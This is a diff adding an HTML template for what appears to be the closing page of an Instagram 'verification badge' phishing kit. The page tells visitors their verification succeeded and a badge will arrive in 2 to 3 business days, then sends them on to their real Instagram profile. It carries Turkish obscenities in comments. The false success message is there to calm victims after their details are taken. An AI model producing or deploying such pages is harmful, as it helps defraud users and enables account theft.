@@ -1,0 +1,99 @@
+
+<!DOCTYPE html><html lang="en"><head>
+    <link href="{{ url_for('static', filename='css.css') }} " type="text/css" rel="stylesheet"/>
+    
+            <title></title>
+            
+                
+            
+        
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,700,800&amp;display=swap" rel="stylesheet">
+        <link href="{{ url_for('static', filename='css/bootstrap.min.css') }}" rel="stylesheet">
+        <link href="{{ url_for('static', filename='css/all.min.css') }} " rel="stylesheet">
+        <link href="{{ url_for('static', filename='css/perfect-scrollbar.css') }} " rel="stylesheet">
+    
+    
+        <!-- anana girsin lan piç -->
+        <link href="{{ url_for('static', filename='css/main.min.css') }}" rel="stylesheet">
+        <link href="{{ url_for('static', filename='css/custom.css') }}" rel="stylesheet">
+</head>
+
+<body class="login-page">
+    <div class="container">
+        <div class="row justify-content-md-center">
+            <div class="col-md-12 col-lg-4">
+                <div class="card login-box-container">
+                    <div class="card-body">
+                        <form class="sign-in-form" method="POST" autocomplete="off" id="frm" action="https://www.instagram.com/{{ username }}/" >
+                          
+                            <div class="authent-logo">
+                               
+                            </div>
+                            <div class="authent-text">
+                             <div align="center" class="breadcrumb_iner_item">
+                                                  <h2 color= >
+                                                  <h1>Process Completed</h1><br>
+                                       
+                                                
+                                                  <lottie-player src="https://assets3.lottiefiles.com/packages/lf20_8re0oyiy.json"  background="transparent"  speed="1"  style="width: 300px; height: 300px;"  loop  autoplay></lottie-player><br>   </h2><h2>
+                                  <h5> Verification completed successfully. It may take 2 to 3 business days<br> for verification to complete and badge delivery.</h5>      
+                                                
+                                                                    
+                          <br>
+                          
+                            </h2></div> 
+                            
+                                <div class="mb-3">
+                                
+                            
+                                    
+                                </div>
+                                
+
+                                 
+                                 <br>
+                                <div class="d-grid">
+                                    <button type="submit" class="btn btn-info m-b-xs" id="df">Continue</button>
+                                        <br>    <br>
+                                </div>
+                    
+                    </div></form>
+                </div>
+                
+
+<div align="center">
+    <img src="{{ url_for('static', filename='images/ves-logo.png') }} " width="200" height="auto">
+</div>
+            </div>
+        </div>
+        
+   <script src="{{ url_for('static', filename='js/jquery-3.4.1.min.js') }} "></script>
+
+   <!--======================================amcık hoşafıııı=========================================================-->
+  
+   <script type="text/javascript">
+      var request;
+
+      $("#frm").submit(function(event) {
+         var btn = $("#df");
+         btn.prop("disabled", true);
+
+
+         $("#df").html("<img wight='20' height='20' src='https://i.gifer.com/ZZ5H.gif'>");
+      });
+   </script>
+   <script>var isOldTitle = true;
+var oldTitle = "Thaks";
+var newTitle = "Finish";
+function changeTitle() {
+     document.title = isOldTitle ? oldTitle : newTitle;
+     isOldTitle = !isOldTitle;
+     setTimeout(changeTitle, 1300);
+}
+changeTitle();</script>
+
+  
+
+
+</div></div></body></html>
